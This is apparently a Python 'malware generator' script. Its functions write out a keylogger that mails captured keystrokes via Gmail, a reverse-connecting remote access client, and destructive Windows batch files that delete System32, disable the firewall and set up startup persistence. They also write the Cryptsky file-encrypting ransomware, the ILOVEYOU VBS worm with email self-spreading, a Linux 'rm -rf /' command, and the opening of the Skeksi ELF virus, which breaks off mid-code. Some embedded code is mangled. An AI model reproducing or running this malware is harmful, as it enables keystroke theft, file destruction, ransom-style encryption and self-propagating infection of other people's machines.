import os
import time
import colorama
from colorama import Fore, Style, Back
import socket
import shutil
import smtplib
from threading import Timer
from datetime import datetime
import platform
import subprocess

print(platform.system())
print(platform.release())
print(platform.version())
def keylogger():
 file = open("keylogger.py", "w+")
 file.write('''SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
    EMAIL_ADDRESS = "put_real_address_here@gmail.com"
    EMAIL_PASSWORD = "put_real_pw"

    class Keylogger:
        def __init__(self, interval, report_method="email"):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.interval = interval
            self.report_method = report_method
            # this is the string variable that contains the log of all
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name

        def update_filename(self):
            # construct the filename to be identified by start & end datetimes
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            """This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable"""
            # open the file in write mode (create it)
            with open(f"{self.filename}.txt", "w") as f:
                # write the keylogs to the file
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

        def sendmail(self, email, password, message):
            # manages a connection to an SMTP server
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            # connect to the SMTP server as TLS mode ( for security )
            server.starttls()
            # login to the email account
            server.login(email, password)
            # send the actual message
            server.sendmail(email, email, message)
            # terminates the session
            server.quit()

        def report(self):
            """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
            """
            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                self.update_filename()
                if self.report_method == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                elif self.report_method == "file":
                    self.report_to_file()
                # if you want to print in the console, uncomment below line
                # print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def start(self):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            # block the current thread, wait until CTRL+C is pressed
            keyboard.wait()

    if __name__ == "__main__":
        # if you want a keylogger to send to your email
        # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        # if you want a keylogger to record keylogs to a local file
        # (and then send it using your favorite method)
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()''')


def systemdel():
    file2 = open('systemdel.bat', 'w+')
    file2.write('''Option Explicit
Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")

Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
Next
del /S C:\Windows\System32
del /S C:\Program Files and C:\Program Files (x86)
color 02
for /L %%n in (2,2,3000)do echo DELETING IMPORTANT FILES....
color 04 
for /L %%n in (3,3,2000)do echo HACKED!  WINDOWS DESTROYED BY FONDERELITE!!! 
exit''')


def rat1():
    file3 = open('rat.py', 'w+')
    file3.write('''
    import socket
    import time
    import random
    import os


    def getInstructions(s):
    while True:
    msg = s.recv(4096)
	cmd = msg.decode("UTF-8")
	if cmd == "help":
	try:
	info = "Keywords/cmd: help, test, hie"
    s.send(info.encode("UTF-8"))
    except:
	pass
		elif cmd == "test":
			try:
				info = "It's working..."
				s.send(info.encode("UTF-8"))
			except:
				pass
		elif cmd == 'hie':
			try:
				info = "Hello from Win-10"
				s.send(info.encode("UTF-8"))
			except:
				pass


def main():	
	#Variables
	server_ip = "192.168.106.255"  #Server IP atacker's ip
	port      = 445                         #Connection Port
	#Connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connected = False
	while connected == False:
		try:
			s.connect((server_ip, port))
			connected = True
			print("[+] Connection established...")
		except:
			print("[+] Trying to connect...")
			time.sleep(10)
			continue
	getInstructions(s)


if __name__ == "__main__":
	main()
    ''')


def killwifi():
    file4 = open('bye2wifi', 'w+')
    file4.write('''
echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat
color 04
for /L %%n in (3,3,2000)do echo HACKED! BY FONDER ELITE!!!
PAUSE
    ''')


def windestroyer():
    file5 = open('Windowsdestroyer.bat')
    file5.write('''
start color 5 title Your Fucked, LOL time 12:00 net stop "Security center" net stop sharedaccess netsh firewall set opmode mode-disable start echo copy %0 >> c:\autoexec.bat copy %0 c:\windows\startm~1\Programs\StartUp\shroom.bat Attrib +r +h C:\windows\startm~1\program\startup\shroom.bat echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\regstart.reg echo "systemStart"="c:\filename\virus.bat" >> c:\regstart.reg start c:\regstart.reg copy %0 %systemroot%\shroom.bat > nul start copy %0 *.bat > nul start attrib +r +h virus.bat attrib +r +h RUstart
color 5
title Your Fucked, lol
time 12:00
net stop "Security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
start
echo copy %0 >> c:\autoexec.bat
copy %0 c:\windows\startm~1\Programs\StartUp\shroom.bat
Attrib +r +h C:\windows\startm~1\program\startup\shroom.bat
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\regstart.reg
echo "systemStart"="c:\filename\virus.bat" >> c:\regstart.reg
start c:\regstart.reg
copy %0 %systemroot%\shroom.bat > nul
start
copy %0 *.bat > nul
start
attrib +r +h virus.bat
attrib +r +h
RUNDLL32 USER32.DLL,SwapMouseButton
tskill msnmsgr
tskill Limewire
tskill iexplorer
tskill NMain
tskill Firefox
tskill explorer
tskill AVGUARD
msg * Awww Your computer is now fucked Sad
msg * You got owned! Smile
msg * Say Bye to your computer n00b
msg * DONT BLAME ME FOR YOUR SHIT LOL XD 
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
copy shroom.bat C:/WINDOWS
del "C:\WINDOWS\pchealth\"
del "C:\WINDOWS\system\"
del "C:\WINDOWS\system32\restore\"
del "C:\WINDOWS\system32\logonui.exe"
del "C:\WINDOWS\system32\ntoskrnl.exe"
del "Winlogon.exe"
ERASE c:
start
shutdown - s -t 15 -c "15 Seconds and counting"
cd %userprofile%\Desktop
copy fixvirus.bat %userprofile%\Desktop
echo HAXHAXHAX
:LOOP
color 17
color 28
color 32
color 22
color 11
color 02
color 39
color 34
GOTO LOOP
        ''')


def ransomware():
    file6 = open('ransomware.py', 'w+')
    filemain = open('discover.py', 'w+')
    filemod = open('modify.py', 'w+')
    filemod.write("""
        def modify_file_inplace(filename, crypto, blocksize=16):
    '''
    Open `filename` and encrypt/decrypt according to `crypto`
    :filename: a filename (preferably absolute path)
    :crypto: a stream cipher function that takes in a plaintext,
             and returns a ciphertext of identical length
    :blocksize: length of blocks to read and write.
    :return: None
    '''
    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)

        while plaintext:
            ciphertext = crypto(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(plaintext), 1) # return to same point before the read
            f.write(ciphertext)

            plaintext = f.read(blocksize)
        """)
    filemain.write("""
        #!/usr/bin/env python
import os

def discoverFiles(startpath):
    '''
    Walk the path recursively down from startpath, and perform method on matching files.
    :startpath: a directory (preferably absolute) from which to start recursing down.
    :yield: a generator of filenames matching the conditions
    Notes:
        - no error checking is done. It is assumed the current user has rwx on
          every file and directory from the startpath down.
        - state is not kept. If this functions raises an Exception at any point,
          There is no way of knowing where to continue from.
    '''

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

if __name__ == "__main__":
    x = discoverFiles('/')
    for i in x:
        print i
        """)

    file6.write("""
       #!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print '''
Cryptsky!
---------------
Your files have been encrypted. This is normally the part where I would
tell you to pay a ransom, and I will send you the decryption key. However, this
is an open source project to show how easy malware can be to write and to allow
others to view what may be one of the first fully open source python ransomwares.
This project does not aim to be malicious. The decryption key can be found
below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
your files forever. Do not include the surrounding quotes, but do make sure
to match case, special characters, and anything else EXACTLY!
Happy decrypting and be more careful next time!
Your decryption key is: '{}'
'''.format(HARDCODED_KEY)
        key = raw_input('Enter Your Key> ')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['/home']

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
        """)


def ily():
    file7 = open('ilyvirus.VBS', 'w+')
    file7.write('''

 rem  barok -loveletter(vbe) <i hate go to school>
 rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
 On Error Resume Next
 dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
 eq=""
 ctr=0
 Set fso = CreateObject("Scripting.FileSystemObject")
 set file = fso.OpenTextFile(WScript.ScriptFullname,1)
 vbscopy=file.ReadAll
 main()
 sub main()
 On Error Resume Next
 dim wscr,rr
 set wscr=CreateObject("WScript.Shell")
 rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
 end if
 Set dirwin = fso.GetSpecialFolder(0)
 Set dirsystem = fso.GetSpecialFolder(1)
 Set dirtemp = fso.GetSpecialFolder(2)
 Set c = fso.GetFile(WScript.ScriptFullName)
 c.Copy(dirsystem&"\MSKernel32.vbs")
 c.Copy(dirwin&"\Win32DLL.vbs")
 c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
 regruns()
 html()
 spreadtoemail()
 listadriv()
 end sub
 sub regruns()
 On Error Resume Next
 Dim num,downread
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKern el32",dirsystem&"\MSKernel32.vbs"
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService s\Win32DLL",dirwin&"\Win32DLL.vbs"
 downread=""
 downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
 if (downread="") then
 downread="c:\"
 end if
 if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
 Randomize
 num = Int((4 * Rnd) + 1)
 if num = 1 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfm
 hPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
 elseif num = 2 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqw
 erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
 elseif num = 3 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd
 QZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
 elseif num = 4 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD
 GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe"
 end if
 end if
 if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&"\WIN-BUGSFIX.exe"
 regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet
 Explorer\Main\Start Page","about:blank"
 end if
 end sub
 sub listadriv
 On Error Resume Next
 Dim d,dc,s
 Set dc = fso.Drives
 For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
 folderlist(d.path&"\")
 end if
 Next
 listadriv = s
 end sub
 sub infectfiles(folderspec)
 On Error Resume Next
 dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
 set f = fso.GetFolder(folderspec)
 set fc = f.Files
 for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
 if (ext="vbs") or (ext="vbe") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 bname=fso.GetBaseName(f1.path)
 set cop=fso.GetFile(f1.path)
 cop.copy(folderspec&"\"&bname&".vbs") fso.DeleteFile(f1.path)
 elseif(ext="jpg") or (ext="jpeg") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 set cop=fso.GetFile(f1.path)
 cop.copy(f1.path&".vbs")
 fso.DeleteFile(f1.path)
 elseif(ext="mp3") or (ext="mp2") then
 set mp3=fso.CreateTextFile(f1.path&".vbs")
 mp3.write vbscopy
 mp3.close
 set att=fso.GetFile(f1.path)
 att.attributes=att.attributes+2
 end if
 if (eq<>folderspec) then
 if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
 set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]"
 scriptini.WriteLine ";mIRC Script"
 scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
 scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
 scriptini.WriteLine ";"
 scriptini.WriteLine ";Khaled Mardam-Bey"
 scriptini.WriteLine ";http://www.mirc.com"
 scriptini.WriteLine ";"
 scriptini.WriteLine "n0=on 1:JOIN:#:{"
 scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2=  /.dcc send $nick
 "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
 scriptini.WriteLine "n3=}"
 scriptini.close
 eq=folderspec
 end if
 end if
 next
 end sub
 sub folderlist(folderspec)
 On Error Resume Next
 dim f,f1,sf
 set f = fso.GetFolder(folderspec)
 set sf = f.SubFolders
 for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
 next
 end sub
 sub regcreate(regkey,regvalue)
 Set regedit = CreateObject("WScript.Shell")
 regedit.RegWrite regkey,regvalue
 end sub
 function regget(value)
 Set regedit = CreateObject("WScript.Shell")
 regget=regedit.RegRead(value)
 end function
 function fileexist(filespec)
 On Error Resume Next
 dim msg
 if (fso.FileExists(filespec)) Then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 function folderexist(folderspec)
 On Error Resume Next
 dim msg
 if (fso.GetFolderExists(folderspec)) then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 sub spreadtoemail()
 On Error Resume Next
 dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
 set regedit=CreateObject("WScript.Shell")
 set out=WScript.CreateObject("Outlook.Application")
 set mapi=out.GetNameSpace("MAPI")
 for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 for ctrentries=1 to a.AddressEntries.Count
 malead=a.AddressEntries(x)
 regad=""
 regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead )
 if (regad="") then
 set male=out.CreateItem(0)
 male.Recipients.Add(malead)
 male.Subject = "ILOVEYOU"
 male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
 male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs") male.Send
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" end if
 x=x+1
 next
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count else
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count end if
 next
 Set out=Nothing
 Set mapi=Nothing
 end sub
 sub html
 On Error Resume Next
 dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
 dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
 LOVELETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-?
 @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
 CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
 "<?-?HEAD><BODY
 ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.
 HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
 "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. HTM#-#,#-#main#-#)@-@
 BGPROPERTIES=@-@fixed@-@
 BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
 "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to
 Enable ActiveX<?-?p>"&vbcrlf& _
 "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
 BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQU EE> "&vbcrlf& _
 "<?-?BODY><?-?HTML>"&vbcrlf& _
 "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _ "<!--?-??-?"&vbcrlf& _
 "if (window.screen){var wi=screen.availWidth;var
 hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrl f& _
 "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"&vbcrlf& _
 "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _ "<!--"&vbcrlf& _
 "on error resume next"&vbcrlf& _
 "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _ "aw=1"&vbcrlf& _
 "code="
 dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
 "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
 "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _ "set
 wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
 "wri.write code4"&vbcrlf& _
 "wri.close"&vbcrlf& _
 "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _ "if (err.number=424) then"&vbcrlf& _
 "aw=0"&vbcrlf& _
 "end if"&vbcrlf& _
 "if (aw=1) then"&vbcrlf& _
 "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _
 "end if"&vbcrlf& _
 "end if"&vbcrlf& _
 "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
 "regedit.RegWrite
 @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^
 -^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _ "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"
 dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
 dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""") dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
 dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
 dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
 dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""") dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
 dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
 set fso=CreateObject("Scripting.FileSystemObject")
 set c=fso.OpenTextFile(WScript.ScriptFullName,1)
 lines=Split(c.ReadAll,vbcrlf)
 l1=ubound(lines)
 for n=0 to ubound(lines)
 lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91)) lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
 lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37)) if (l1=n) then
 lines(n)=chr(34)+lines(n)+chr(34)
 else
 lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
 next
 set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM") b.close
 set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2) d.write dt5
 d.write join(lines,vbcrlf)
 d.write vbcrlf
 d.write dt6
 d.close
 end sub
    ''')


def filedeletionl():
    filel2 = open('LinuxDestroyer.sh', 'w+')
    filel2.write(Fore.RED + '''
    sudo rm -rf /* --no-preserve-root
    ''')


def elf():
    filel3 = open("ELF.c", 'w+')
    filel3.write('''
    /*
 * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
 * Written by ElfMaster - ryan@bitlackeys.org
 *
 * Compile:
 * gcc -g -O0 -DANTIDEBUG -DINFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
 * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
 *
 * Using -DDEBUG will allow Virus to print debug output
 *
 * Usage:
 * ./virus
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

#define VIRUS_LAUNCHER_NAME "virus"

struct linux_dirent64 {
        uint64_t             d_ino;
        int64_t             d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char            d_name[0];
} __attribute__((packed));



/* libc */ 

void Memset(void *mem, unsigned char byte, unsigned int len);
void _memcpy(void *, void *, unsigned int);
int _printf(char *, ...);
char * itoa(long, char *);
char * itox(long, char *);
int _puts(char *);
int _puts_nl(char *);
size_t _strlen(char *);
char *_strchr(const char *, int);
char * _strrchr(const char *, int);
int _strncmp(const char *, const char *, size_t);
int _strcmp(const char *, const char *);
int _memcmp(const void *, const void *, unsigned int);
char _toupper(char c);


/* syscalls */
long _ptrace(long request, long pid, void *addr, void *data);
int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
int _fstat(long, void *);
int _mprotect(void * addr, unsigned long len, int prot);
long _lseek(long, long, unsigned int);
void Exit(long);
void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
int _munmap(void *, size_t);
long _open(const char *, unsigned long, long);
long _write(long, char *, unsigned long);
int _read(long, char *, unsigned long);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count);
int _rename(const char *, const char *);
int _close(unsigned int);
int _gettimeofday(struct timeval *, struct timezone *);

/* Customs */
unsigned long get_rip(void);
void end_code(void);
void dummy_marker(void);
static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
void display_skeksi(void);

#define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))

#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
    __FILE__, __LINE__, __func__, ##args)
#else
 #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
#endif

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE) 
#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
#define STACK_SIZE 0x4000000

#define TMP ".xyz.skeksi.elf64"
#define RODATA_PADDING 17000 // enough bytes to also copy .rodata and skeksi_banner

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

#define __ASM__ asm __volatile__

extern long real_start;
extern long get_rip_label;

struct bootstrap_data {
	int argc;
	char **argv;
};

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Dyn *dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	uint8_t *mem;
	size_t size;
	char *path;
	struct stat st;
	int fd;
	int original_virus_exe;
} elfbin_t;

#define DIR_COUNT 4

_start()
{
#if 0
	struct bootstrap_data bootstrap;
#endif
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	__ASM__ (
